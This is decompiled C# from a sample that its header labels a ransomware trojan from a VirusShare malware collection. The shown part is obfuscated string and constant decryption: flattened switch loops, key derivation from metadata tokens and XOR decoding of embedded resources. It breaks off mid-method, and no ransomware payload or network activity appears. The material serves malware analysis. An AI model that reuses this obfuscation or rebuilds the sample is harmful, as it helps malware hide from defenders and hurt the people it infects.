// Decompiled with JetBrains decompiler
// Type: ��d�A�wӸ�:�
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591BD174-6BA7-4AF8-A4DB-5D88FD31BDF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2c01a4b5df598caa723ca49a0e4b85d0a6bc07036550fe1bdc6fe8c7ff4495d2.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \u0005\uFFFD\uFFFD\u0018d\uFFFD\u0001A\uFFFDw\u0014Ӹ\uFFFD\u003A\uFFFD
{
  static object \uFFFD\u000D\uFFFD\uFFFDzT\uFFFD\uFFFD\u0002\uFFFD\uD82D\uDF6E\u00066(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = -~11 + 2;
    uint num3;
    object obj;
    Stream stream;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        int num10;
        do
        {
          int num11;
          do
          {
            int num12;
            do
            {
              switch (num2)
              {
                case 1:
                  goto label_4;
                case 2:
                  goto label_6;
                case 3:
                  goto label_7;
                case 4:
                  if (num4 >= 32U)
                    break;
                  goto label_10;
                case 5:
                  goto label_11;
                case 6:
                  goto label_14;
                case 7:
                  goto label_15;
                case 8:
                  goto label_17;
                case 9:
                  goto label_18;
                case 10:
                  goto label_19;
                case 11:
                  goto label_22;
                case 12:
                  goto label_24;
                case 13:
                  goto label_25;
                case 14:
                  goto label_26;
                case 15:
                  goto label_27;
              }
              num12 = (int) num4;
              num2 = 21 - (4 + 2 + (3 + 7));
            }
            while ((uint) num12 < 32U);
            num2 = ~~~-12;
            continue;
label_4:
            num3 = num5 ^ b;
            if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num3, out obj))
            {
              Monitor.Enter((object) (stream = \u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線));
              goto label_28;
            }
            else
              goto label_53;
label_6:
            ++num6;
            num2 = -~--2;
            continue;
label_7:
            num11 = (int) num6;
            num2 = ~(~(6 + 7) - 3) - 3;
            continue;
label_11:
            if (num4 < 48U)
              goto label_6;
            else
              goto label_12;
label_19:
            num8 ^= (uint) ((int) num5 * (int) num6 + 1) % 16U;
            num5 += (uint) (((int) num7 | (int) num8) ^ 1729494439);
            goto label_6;
label_22:
            if (num4 >= 48U)
              goto label_11;
            else
              goto label_23;
          }
          while ((uint) num11 <= 64U);
          num2 = 5 - (4 - 6 - (3 - 9));
          continue;
label_10:
          num7 ^= (uint) (((int) num5 & 16711935) << 8 ^ ((int) ((num5 & 16776960U) >> 8) | ~(int) num5 & (int) ushort.MaxValue));
          num2 = ~-30 + -6 - 8;
          continue;
label_12:
          num10 = (int) num4;
          num2 = -1 - -(5 - 2);
        }
        while ((uint) num10 >= 64U);
        num2 = ~~--9;
        continue;
label_14:
        num4 = (num5 & (uint) byte.MaxValue) % 64U;
        num2 = ~~7 - 2 - -2;
        continue;
label_15:
        if (num4 >= 0U && num4 < 16U)
        {
          num2 = -6 - (~5 - 8);
          continue;
        }
        num9 = (int) num4;
        num2 = ~~~-1;
        continue;
label_17:
        num7 |= (uint) ((int) ((num5 & 65280U) >> 8) & (int) ((num5 & 16711680U) >> 16) ^ ~(int) num5 & (int) byte.MaxValue);
        num2 = 0 + -~4 + (7 - 2);
        continue;
label_18:
        num7 ^= (uint) (((int) ((num5 & 16711680U) >> 16) | ~((int) num5 & (int) byte.MaxValue)) * (~(int) num5 & 16711680));
        num8 += (num5 ^ num6 - 1U) % num4;
        num5 -= (uint) (~((int) num7 ^ (int) num8) + 1729494439);
        num2 = ~(5 + (-7 - ~4)) + 6;
      }
      while ((uint) num9 < 16U);
      num2 = --13 - 9;
      continue;
label_23:
      num7 += (uint) (((int) num5 & (int) byte.MaxValue | (int) ((num5 & 16711680U) >> 16)) + (~(int) num5 & (int) byte.MaxValue));
      num8 -= (uint) ~((int) num5 + (int) num4) % 48U;
      num5 ^= num7 % num8 | 1729494439U;
      num2 = -(~13 + 2);
      continue;
label_24:
      num2 = --3 - -3 - 4;
      continue;
label_25:
      num5 = (uint) (((int) num5 & 16777215) << 8) | (num5 & 4278190080U) >> 24;
      num2 = ~~9 - 3;
      continue;
label_26:
      num5 = 1691683444U ^ num1;
      num7 = 1306393168U;
      num8 = 1231516419U;
      num6 = 1U;
      num2 = -(--3 - (4 + 2));
      continue;
label_27:
      num8 += num5 * num6 % 32U;
      num5 |= (uint) ((int) num7 + ~(int) num8 & 1729494439);
      num2 = -1 - -(5 - 2);
    }
label_28:
    byte[] bytes;
    byte num13;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
      int num14 = -1 - -4 - 2;
      while (true)
      {
        switch (num14)
        {
          case 1:
            binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
            num13 = binaryReader.ReadByte();
            num14 = 7 - ~3 - 2 - (2 + 2) - 5;
            continue;
          default:
            goto label_30;
        }
      }
label_30:
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    finally
    {
      Monitor.Exit((object) stream);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876219 ^ currentMethod.MetadataToken);
    int num15 = --13 - 8;
    while (true)
    {
      int index;
      uint num16;
      ushort num17;
      ushort num18;
      ushort num19;
      int num20;
      do
      {
        ushort num21;
        int num22;
        do
        {
          switch (num15)
          {
            case 1:
              num15 = ----12;
              continue;
            case 2:
              obj = (object) Encoding.UTF8.GetString(bytes);
              break;
            case 3:
              ++index;
              num15 = ~(7 - 7 - (15 - ~~2));
              continue;
            case 5:
              num16 = (uint) (((int) num3 + (int) num13) * 679840784);
              num17 = (ushort) (num16 >> 16);
              num21 = (ushort) (num16 & (uint) ushort.MaxValue);
              num18 = num21;
              num19 = num17;
              index = 0;
              num15 = ~--4 + 6;
              continue;
            case 6:
              num22 = (int) num13;
              num15 = 7 - 5 + ~8 - -14;
              continue;
            case 7:
              switch (num13)
              {
                case 55:
                  goto label_45;
                case 152:
                  goto label_44;
                case 238:
                  obj = (object) BitConverter.ToInt32(bytes, 0);
                  break;
              }
              break;
            case 9:
              goto label_46;
            case 10:
              goto label_47;
            case 11:
              goto label_48;
            case 12:
              goto label_49;
            case 13:
              goto label_52;
            case 14:
              goto label_53;
            case 15:
              goto label_54;
          }
          \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num3] = obj;
          num15 = 2 - ~(6 + -(2 - 7));
        }
        while (num22 != 163);
        num15 = -~6 + 2;
        continue;
label_44:
        obj = (object) BitConverter.ToInt64(bytes, 0);
        num15 = ~(-10 - --3) - 4;
        continue;
label_45:
        num15 = 9 - ~~7;
        continue;
label_46:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        num15 = -(-4 - (~4 + (9 - 3))) - 5;
        continue;
label_47:
        num19 = (ushort) ((num16 * (uint) num19 + (uint) num21) % 65536U);
        num15 = ~(24 - (6 + 6 - ~7)) + 8;
        continue;
label_48:
        obj = (object) BitConverter.ToDouble(bytes, 0);
        num15 = ~(-4 - ~(3 + 4) + ~8);
        continue;
label_49:
        if (index >= bytes.Length)
        {
          num20 = (int) num13;
          num15 = -~~-6;
        }
        else
          goto label_52;
      }
      while (num20 != 91);
      num15 = ~3 - (6 - 8) - -29 - (8 + 8);
      continue;
label_52:
      bytes[index] ^= (byte) ((num16 * (uint) num18 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
      num15 = ~-34 - (9 + 7) - 2;
      continue;
label_54:
      num18 = (ushort) ((num16 * (uint) num18 + (uint) num17) % 65536U);
      num15 = ~(2 - 15) - 2;
    }
label_53:
    return obj;
  }

  static object \uFFFD\u0012\uFFFDv̺\u0010\uFFFD\u0011\uFFFD\uFFFDf\uFFFD\uFFFD\uFFFD\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = --11 + 5;
    uint num3;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        int num10;
        do
        {
          switch (num2)
          {
            case 1:
              if (num4 >= 0U && num4 < 16U)
              {
                num2 = ~-9 + 9;
                continue;
              }
              if (num4 >= 16U)
              {
                int num11 = (int) num4;
                num2 = -(~4 + -6);
                if ((uint) num11 < 32U)
                {
                  num2 = ~-10 - 7;
                  continue;
                }
                continue;
              }
              goto case 11;
            case 2:
              num5 ^= (uint) (((int) num6 & 16711935) << 8 ^ ((int) ((num6 & 16776960U) >> 8) | ~(int) num6 & (int) ushort.MaxValue));
              num2 = -~~-9;
              continue;
            case 3:
            case 12:
              ++num8;
              break;
            case 4:
              num6 += (uint) (((int) num5 | (int) num7) ^ 1167736622);
              num2 = --~-4;
              continue;
            case 5:
              int num12 = (int) num4;
              num2 = --23 - (9 - 6) - 8;
              if ((uint) num12 < 64U)
              {
                num2 = ~~12 - 5;
                continue;
              }
              continue;
            case 6:
              num6 = (uint) (((int) num6 & 16777215) << 8) | (num6 & 4278190080U) >> 24;
              num2 = -(4 - 28 - -6);
              continue;
            case 7:
              num5 ^= (uint) (((int) ((num6 & 16711680U) >> 16) | ~((int) num6 & (int) byte.MaxValue)) * (~(int) num6 & 16711680));
              num7 += (num6 ^ num8 - 1U) % num4;
              num2 = -~17 - 5;
              continue;
            case 8:
              num2 = -(-8 - (6 - -3)) - 5;
              continue;
            case 9:
              num7 += num6 * num8 % 32U;
              num2 = ~(-2 - --21);
              continue;
            case 10:
              num8 = 1U;
              num2 = 8 - (-(6 - 6) - -1 - -7);
              continue;
            case 11:
              int num13 = (int) num4;
              num2 = ~-7 - -4 + 5;
              if ((uint) num13 >= 32U)
              {
                num2 = -(2 + 3 - ~-29);
                continue;
              }
              continue;
            case 13:
              goto label_21;
            case 14:
              goto label_22;
            case 15:
              goto label_23;
            case 16:
              goto label_25;
            case 17:
              goto label_26;
            case 18:
              goto label_27;
            case 19:
              goto label_28;
            case 20:
              goto label_29;
            case 21:
              goto label_30;
            case 22:
              goto label_31;
            case 23:
              goto label_32;
            case 24:
              goto label_34;
          }
          num10 = (int) num8;
          num2 = --22 - (5 + 2) - 9;
        }
        while ((uint) num10 <= 64U);
        num2 = -~--20;
        continue;
label_21:
        num6 -= (uint) (~((int) num5 ^ (int) num7) + 1167736622);
        num2 = 17 - 5;
        continue;
label_22:
        num5 = 154893284U;
        num7 = 889992355U;
        num2 = -(~18 + 9);
        continue;
label_23:
        num9 = (int) num4;
        num2 = --18 - 9 + 3;
        continue;
label_32:
        if (num4 >= 48U)
          goto label_23;
        else
          goto label_33;
      }
      while ((uint) num9 < 48U);
      num2 = -(-2 - ~(5 - 6)) + 3;
      continue;
label_25:
      num6 = 1651201712U ^ num1;
      num2 = --(~-7 - -8);
      continue;
label_26:
      num5 |= (uint) ((int) ((num6 & 65280U) >> 8) & (int) ((num6 & 16711680U) >> 16) ^ ~(int) num6 & (int) byte.MaxValue);
      num7 ^= (uint) ((int) num6 * (int) num8 + 1) % 16U;
      num2 = ~(-11 + 6);
      continue;
label_27:
      num4 = (num6 & (uint) byte.MaxValue) % 64U;
      num2 = ~~(-9 - (-5 + -5));
      continue;
label_28:
      num6 ^= num5 % num7 | 1167736622U;
      num2 = ~~21 - 9;
      continue;
label_29:
      num7 -= (uint) ~((int) num6 + (int) num4) % 48U;
      num2 = 4 - ---15;
      continue;
label_30:
      num3 = num6 ^ b;
      num2 = ~~(32 - (~5 + (5 + 9)));
      continue;
label_31:
      num6 |= (uint) ((int) num5 + ~(int) num7 & 1167736622);
      num2 = --5 - -3;
      continue;
label_33:
      num5 += (uint) (((int) num6 & (int) byte.MaxValue | (int) ((num6 & 16711680U) >> 16)) + (~(int) num6 & (int) byte.MaxValue));
      num2 = 6 - ~--13;
    }
label_34:
    object obj;
    if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num3, out obj))
    {
      byte num14;
      byte[] bytes;
      lock (\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
        binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
        num14 = binaryReader.ReadByte();
        bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
        switch (~(12 - (6 + 2 + (4 + 7)) - -6))
        {
        }
      }
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876218 ^ currentMethod.MetadataToken);
      int num15 = ~-(7 + (8 - 3) - 11);
      while (true)
      {
        uint num16;
        ushort num17;
        ushort num18;
        int index;
        ushort num19;
        ushort num20;
        int num21;
        do
        {
          switch (num15)
          {
            case 1:
              index = 0;
              num15 = 25 - (9 + 5 - -8);
              continue;
            case 2:
              num19 = num17;
              num15 = -(5 - 7 - ~0);
              continue;
            case 3:
              for (; index < bytes.Length; ++index)
              {
                bytes[index] ^= (byte) ((num16 * (uint) num20 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
                num20 = (ushort) ((num16 * (uint) num20 + (uint) num17) % 65536U);
                num19 = (ushort) ((num16 * (uint) num19 + (uint) num18) % 65536U);
              }
              num15 = -~9 - 5;
              continue;
            case 4:
              obj = (object) BitConverter.ToInt64(bytes, 0);
              goto case 6;
            case 5:
              switch (num14)
              {
                case 91:
                  num15 = 5 - ~(8 - 7);
                  continue;
                case 163:
                  obj = (object) BitConverter.ToSingle(bytes, 0);
                  num15 = ~(-2 - ~-3) + 3;
                  continue;
                case 238:
                  obj = (object) BitConverter.ToInt32(bytes, 0);
                  num15 = ~(-19 - (~3 + ~9)) + 8;
                  continue;
                default:
                  goto label_57;
              }
            case 6:
            case 12:
              \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num3] = obj;
              num15 = 8 - (4 - 4 - (6 - (9 + 2 + (2 - 8))));
              continue;
            case 7:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              goto case 6;
            case 8:
              if (num14 == (byte) 55)
              {
                obj = (object) Encoding.UTF8.GetString(bytes);
                goto case 6;
              }
              else
                goto case 6;
            case 9:
              goto label_55;
            case 10:
              num20 = num18;
              num15 = -(~3 + 2) - (3 - 3);
              continue;
            case 11:
label_57:
              num21 = (int) num14;
              num15 = ~(~4 + (4 - 8));
              continue;
            default:
              num16 = (uint) (((int) num3 + (int) num14) * 679840784);
              num17 = (ushort) (num16 >> 16);
              num18 = (ushort) (num16 & (uint) ushort.MaxValue);
              num15 = -(6 - 21) - 5;
              continue;
          }
        }
        while (num21 != 152);
        num15 = ~-3 - -4 - 2;
      }
    }
label_55:
    return obj;
  }

  static object \uFFFDM\uFFFD9\u003C\u0020y\uFFFD\uFFFD\u0025\uFFFD4\uFFFD\u001E\u000C\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = -3 - -6 + 5;
    Stream stream;
    uint num3;
    object obj;
    while (true)
    {
      int num4;
      do
      {
        uint num5;
        uint num6;
        uint num7;
        uint num8;
        int num9;
        do
        {
          int num10;
          do
          {
            int num11;
            do
            {
              switch (num2)
              {
                case 1:
                  num11 = (int) num6;
                  num2 = -~~-18;
                  continue;
                case 2:
                  goto label_5;
                case 3:
                  goto label_6;
                case 4:
                  goto label_8;
                case 5:
                  goto label_21;
                case 6:
                  goto label_11;
                case 7:
                  goto label_13;
                case 8:
                  goto label_14;
                case 9:
                  goto label_15;
                case 10:
                  goto label_16;
                case 11:
                  goto label_17;
                case 12:
                  goto label_18;
                case 13:
                  goto label_19;
                case 14:
                  goto label_20;
                case 15:
                  if (num6 >= 32U)
                    goto case 1;
                  else
                    goto label_25;
                case 16:
                  goto label_26;
                case 17:
                  goto label_28;
                case 18:
                  goto label_29;
                default:
                  num5 = 1U;
                  num2 = -~-~(9 - 6);
                  continue;
              }
            }
            while ((uint) num11 < 32U);
            num2 = ~3 + (2 + 4) + 4;
            continue;
label_5:
            num2 = 5 - ~~-9;
            continue;
label_6:
            num10 = (int) num6;
            num2 = 7 + (6 - 6 + ~9) + (3 + 7) - 6;
            continue;
label_26:
            if (num6 < 0U || num6 >= 16U)
              goto label_6;
            else
              goto label_27;
          }
          while ((uint) num10 < 16U);
          num2 = -(9 - (28 - ~~4));
          continue;
label_8:
          if (num6 < 64U)
          {
            num7 ^= (uint) (((int) ((num8 & 16711680U) >> 16) | ~((int) num8 & (int) byte.MaxValue)) * (~(int) num8 & 16711680));
            num2 = --8 - (6 - 9) - 4;
            continue;
          }
          goto label_20;
label_11:
          num9 = (int) num6;
          num2 = ~4 - (-23 - -~3) - 4;
          continue;
label_20:
          ++num5;
label_21:
          if (num5 <= 64U)
          {
            num8 = (uint) (((int) num8 & 16777215) << 8) | (num8 & 4278190080U) >> 24;
            num2 = -(-(2 + 3) - 7) - 2;
          }
          else
            goto label_22;
        }
        while ((uint) num9 >= 48U);
        num2 = ~(-26 + (5 + 3));
        continue;
label_13:
        uint num12;
        num12 += (num8 ^ num5 - 1U) % num6;
        num8 -= (uint) (~((int) num7 ^ (int) num12) + 2026086691);
        num2 = --(20 + ~(7 - 2));
        continue;
label_14:
        num8 = 930489148U ^ num1;
        num7 = 1378990617U;
        num12 = 1562615487U;
        num2 = 3 - ~~3;
        continue;
label_15:
        num12 ^= (uint) ((int) num8 * (int) num5 + 1) % 16U;
        num8 += (uint) (((int) num7 | (int) num12) ^ 2026086691);
        num2 = -5 - (~~6 - 13);
        continue;
label_16:
        num6 = (num8 & (uint) byte.MaxValue) % 64U;
        num2 = -(~15 - (6 - 6));
        continue;
label_17:
        num2 = ~-14 - (4 + 3) + 8;
        continue;
label_18:
        Monitor.Enter((object) (stream = \u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線));
        goto label_31;
label_19:
        num12 -= (uint) ~((int) num8 + (int) num6) % 48U;
        num8 ^= num7 % num12 | 2026086691U;
        num2 = -~(14 - --4);
        continue;
label_22:
        num3 = num8 ^ b;
        if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num3, out obj))
        {
          num2 = --3 + 9;
          continue;
        }
        goto label_51;
label_25:
        num7 ^= (uint) (((int) num8 & 16711935) << 8 ^ ((int) ((num8 & 16776960U) >> 8) | ~(int) num8 & (int) ushort.MaxValue));
        num12 += num8 * num5 % 32U;
        num8 |= (uint) ((int) num7 + ~(int) num12 & 2026086691);
        num2 = --20 - (9 - 5) - 2;
        continue;
label_27:
        num7 |= (uint) ((int) ((num8 & 65280U) >> 8) & (int) ((num8 & 16711680U) >> 16) ^ ~(int) num8 & (int) byte.MaxValue);
        num2 = -~--8;
        continue;
label_28:
        num7 += (uint) (((int) num8 & (int) byte.MaxValue | (int) ((num8 & 16711680U) >> 16)) + (~(int) num8 & (int) byte.MaxValue));
        num2 = ~-7 + 7;
        continue;
label_29:
        num4 = (int) num6;
        num2 = ~~~-15;
      }
      while ((uint) num4 < 48U);
      num2 = 7 - (7 - 9 + (3 - 5)) + (5 - 3) - 9;
    }
label_31:
    byte num13;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
      int num14 = --~-3;
      while (true)
      {
        switch (num14)
        {
          case 1:
            num13 = binaryReader.ReadByte();
            bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num14 = ~~(-11 - -(2 + 9));
            continue;
          case 2:
            binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
            num14 = --~-2;
            continue;
          default:
            goto label_36;
        }
      }
    }
    finally
    {
      Monitor.Exit((object) stream);
    }
label_36:
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876221 ^ currentMethod.MetadataToken);
    uint num15 = (uint) (((int) num3 + (int) num13) * 679840784);
    int num16 = ~-16 - 6;
    while (true)
    {
      int num17;
      do
      {
        ushort num18;
        ushort num19;
        ushort num20;
        ushort num21;
        int index;
        switch (num16)
        {
          case 1:
            if (num13 == (byte) 91)
            {
              obj = (object) BitConverter.ToDouble(bytes, 0);
              num16 = ~-4 - ~7 - 4;
              continue;
            }
            goto case 11;
          case 2:
            obj = (object) BitConverter.ToSingle(bytes, 0);
            num16 = -(--2 - 9);
            continue;
          case 3:
            obj = (object) BitConverter.ToInt64(bytes, 0);
            num16 = ----5;
            continue;
          case 4:
            ++index;
            break;
          case 5:
          case 7:
          case 12:
            \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num3] = obj;
            goto label_51;
          case 6:
            index = 0;
            break;
          case 8:
            switch (num13)
            {
              case 152:
                goto label_58;
              case 238:
                obj = (object) BitConverter.ToInt32(bytes, 0);
                num16 = ~~--12;
                continue;
              default:
                int num22 = (int) num13;
                num16 = -(-7 - ~-1);
                if (num22 == 55)
                {
                  num16 = ~-(3 - -(4 + 7));
                  continue;
                }
                continue;
            }
          case 9:
            num20 = (ushort) (num15 >> 16);
            num16 = -~--9;
            continue;
          case 10:
            num18 = (ushort) (num15 & (uint) ushort.MaxValue);
            num16 = 3 + ~(3 + 4) - -5;
            continue;
          case 11:
            num17 = (int) num13;
            num16 = -(~9 - -2);
            continue;
          case 13:
            goto label_59;
          default:
            num19 = num18;
            num21 = num20;
            num16 = 6 - ~~0;
            continue;
        }
        if (index >= bytes.Length)
        {
          num16 = 27 + -(8 + 8) + -8 - 2;
        }
        else
        {
          bytes[index] ^= (byte) ((num15 * (uint) num19 + (uint) num21) % 256U ^ (uint) numArray[index % 8]);
          num19 = (ushort) ((num15 * (uint) num19 + (uint) num20) % 65536U);
          num21 = (ushort) ((num15 * (uint) num21 + (uint) num18) % 65536U);
          num16 = -(-21 - (-3 + ~3) - ~9);
        }
      }
      while (num17 != 163);
      num16 = -(-~2 - 1 - (8 - 4));
      continue;
label_58:
      num16 = 7 - 4;
      continue;
label_59:
      obj = (object) Encoding.UTF8.GetString(bytes);
      num16 = ~~(3 + 4);
    }
label_51:
    return obj;
  }

  static object C\u001Cru\uFFFD\uFFFD\u0004\u0004\u0027\u003F\u0008\uFFFD\uFFFD\uFFFD6g(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~(~3 + (7 + 2) - 17) - 9;
    uint num2;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        int num9;
        do
        {
          switch (num1)
          {
            case 1:
              num2 = num3 ^ b;
              num1 = ~~19 - 8;
              continue;
            case 2:
              num3 = 482684336U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
              num5 = 740234297U;
              num6 = 541624747U;
              num1 = -(-5 - (9 - 1));
              continue;
            case 3:
            case 15:
              ++num7;
              goto case 6;
            case 4:
              num5 |= (uint) ((int) ((num3 & 65280U) >> 8) & (int) ((num3 & 16711680U) >> 16) ^ ~(int) num3 & (int) byte.MaxValue);
              num1 = 3 - 6 - ~10;
              continue;
            case 5:
              num5 += (uint) (((int) num3 & (int) byte.MaxValue | (int) ((num3 & 16711680U) >> 16)) + (~(int) num3 & (int) byte.MaxValue));
              num6 -= (uint) ~((int) num3 + (int) num4) % 48U;
              num3 ^= num5 % num6 | 748099123U;
              goto case 3;
            case 6:
              if (num7 > 64U)
              {
                num1 = --6 - 5;
                continue;
              }
              goto label_13;
            case 7:
              goto label_14;
            case 8:
              num6 ^= (uint) ((int) num3 * (int) num7 + 1) % 16U;
              num3 += (uint) (((int) num5 | (int) num6) ^ 748099123);
              goto case 3;
            case 9:
              goto label_19;
            case 10:
              goto label_20;
            case 11:
              goto label_21;
            case 12:
              if (num4 >= 48U)
                break;
              goto label_24;
            case 13:
              goto label_25;
            case 14:
              goto label_26;
            case 16:
              goto label_29;
            default:
              num4 = (num3 & (uint) byte.MaxValue) % 64U;
              if (num4 >= 0U && num4 < 16U)
              {
                num1 = ~(-11 - -6);
                continue;
              }
              if (num4 < 16U || num4 >= 32U)
              {
                if (num4 < 32U)
                  break;
                goto label_28;
              }
              else
                goto label_18;
          }
          num9 = (int) num4;
          num1 = ~(-12 - (4 + (3 - 8))) - 7;
        }
        while ((uint) num9 < 48U);
        num1 = ~(3 - 3 + ~7 - 3) - 3;
        continue;
label_13:
        num3 = (uint) (((int) num3 & 16777215) << 8) | (num3 & 4278190080U) >> 24;
        num1 = 7 - ~-5 - 3;
        continue;
label_14:
        num8 = (int) num4;
        num1 = -0 - -3;
      }
      while ((uint) num8 >= 64U);
      num1 = ~-12 - 2;
      continue;
label_18:
      num5 ^= (uint) (((int) num3 & 16711935) << 8 ^ ((int) ((num3 & 16776960U) >> 8) | ~(int) num3 & (int) ushort.MaxValue));
      num1 = ~---11;
      continue;
label_19:
      num5 ^= (uint) (((int) ((num3 & 16711680U) >> 16) | ~((int) num3 & (int) byte.MaxValue)) * (~(int) num3 & 16711680));
      num1 = ~---15;
      continue;
label_20:
      num6 += num3 * num7 % 32U;
      num3 |= (uint) ((int) num5 + ~(int) num6 & 748099123);
      num1 = ~(-13 - (5 + 3)) - 5;
      continue;
label_24:
      num1 = ~8 - -9 + 5;
      continue;
label_25:
      num7 = 1U;
      num1 = 3 - -(5 - 2);
      continue;
label_26:
      num6 += (num3 ^ num7 - 1U) % num4;
      num1 = ~2 - (-16 - 3);
      continue;
label_28:
      num1 = ~(~7 - (7 - (-2 - (2 - 6))));
      continue;
label_29:
      num3 -= (uint) (~((int) num5 ^ (int) num6) + 748099123);
      num1 = -~-4 + 6;
    }
label_21:
    object obj;
    if (!\u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ.TryGetValue(num2, out obj))
    {
      byte num10;
      byte[] bytes;
      lock (\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線);
        int num11 = ~-~-2;
        while (true)
        {
          switch (num11)
          {
            case 1:
              num10 = binaryReader.ReadByte();
              num11 = 11 - 8 - (7 + 3) + 9;
              continue;
            case 2:
              goto label_34;
            default:
              binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
              num11 = ~~(~(3 - 5) - 0);
              continue;
          }
        }
label_34:
        bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      }
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876220 ^ currentMethod.MetadataToken);
      int num12 = -(-14 + 9);
      while (true)
      {
        uint num13;
        ushort num14;
        ushort num15;
        ushort num16;
        int index;
        ushort num17;
        int num18;
        do
        {
          switch (num12)
          {
            case 1:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              num12 = --(19 - 6);
              continue;
            case 2:
              obj = (object) Encoding.UTF8.GetString(bytes);
              num12 = 3 + 5 - (-20 - (~8 + (4 - 6))) - 4;
              continue;
            case 3:
              num14 = (ushort) (num13 >> 16);
              num12 = -4 - (-17 - -(8 - 9)) - 7;
              continue;
            case 4:
              num12 = ~-21 + ~6;
              continue;
            case 5:
              num13 = (uint) (((int) num2 + (int) num10) * 679840784);
              num12 = ~(8 - --12);
              continue;
            case 6:
            case 13:
              goto label_57;
            case 7:
              num15 = (ushort) (num13 & (uint) ushort.MaxValue);
              num12 = ~-~-16;
              continue;
            case 8:
              num16 = num14;
              index = 0;
              num12 = ~3 - (-24 - (~7 - 3));
              continue;
            case 9:
            case 11:
              if (index < bytes.Length)
              {
                bytes[index] ^= (byte) ((num13 * (uint) num17 + (uint) num16) % 256U ^ (uint) numArray[index % 8]);
                num17 = (ushort) ((num13 * (uint) num17 + (uint) num14) % 65536U);
                num16 = (ushort) ((num13 * (uint) num16 + (uint) num15) % 65536U);
                num12 = 12 - (~9 + (2 + 8));
                continue;
              }
              num18 = (int) num10;
              num12 = -(~~9 - 30 + 5);
              continue;
            case 10:
              if (num10 != (byte) 152)
              {
                int num19 = (int) num10;
                num12 = ~-5 + 9;
                if (num19 == 55)
                {
                  num12 = -~8 - 7;
                  continue;
                }
                continue;
              }
              obj = (object) BitConverter.ToInt64(bytes, 0);
              num12 = 4 - -(11 - 9);
              continue;
            case 12:
              goto label_56;
            case 14:
              goto label_59;
            case 15:
              goto label_60;
            case 16:
              if (num10 != (byte) 163)
              {
                int num20 = (int) num10;
                num12 = 2 - (3 - (23 + ~(9 + 2)));
                if (num20 == 238)
                {
                  num12 = 8 - -(7 - 5) + 2 + 3;
                  continue;
                }
                continue;
              }
              goto label_62;
            default:
              obj = (object) BitConverter.ToSingle(bytes, 0);
              goto label_57;
          }
        }
        while (num18 != 91);
        num12 = ~8 - ~9;
        continue;
label_56:
        ++index;
        num12 = ~-20 - 8;
        continue;
label_59:
        num17 = num15;
        num12 = --(10 - ~-3);
        continue;
label_60:
        obj = (object) BitConverter.ToInt32(bytes, 0);
        num12 = --6 - 2;
        continue;
label_62:
        num12 = -11 - (2 - 5 + -8);
      }
label_57:
